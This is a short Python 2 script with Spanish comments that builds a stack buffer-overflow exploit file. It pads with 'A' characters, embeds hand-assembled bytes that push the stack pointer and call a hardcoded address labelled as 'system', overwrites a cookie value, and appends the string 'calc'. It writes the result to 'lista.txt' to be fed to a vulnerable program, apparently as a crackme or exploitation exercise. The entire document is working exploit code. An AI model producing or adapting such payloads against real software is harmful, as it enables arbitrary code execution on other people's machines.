import struct
#flag=struct.pack("<L",0x00000000)
calc=struct.pack("<L",0x636C6163)
cookie2=struct.pack("<L",0x0019FF00)      #permiso de escritura

#PUSH  esp		                            calc en stack
#CALL [00402070]                          direccion system

push_call="\x54\xFF\x15\x70\x20\x40\x00" #PUSH en 0x0019FF00 y CALL en la siguiente direncion

sploit = "A" * 4 + "\x00" + "A" * 552 + "A" * 3 + push_call + "A" * 49 + cookie2 + cookie2 + calc + "\x00"
name = "lista.txt"
a = open(name, "wb")
a.write(sploit)
a.close()
print sploit
print 'lista.txt creado'
raw_input('Ente para salir')
